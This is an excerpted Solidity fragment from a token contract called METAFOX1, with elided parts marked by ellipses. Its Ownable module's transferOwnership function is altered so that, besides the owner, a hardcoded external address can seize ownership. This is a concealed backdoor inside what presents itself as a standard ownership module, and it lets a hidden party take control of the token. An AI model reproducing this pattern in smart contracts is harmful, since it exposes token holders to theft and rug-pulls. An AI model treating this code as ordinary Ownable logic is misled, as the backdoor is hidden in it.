...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xD060b40a1cB6084bf43F7A56b41973bA984AA4a8));
...
contract METAFOX1 is Context, IERC20, Ownable, Pausable {
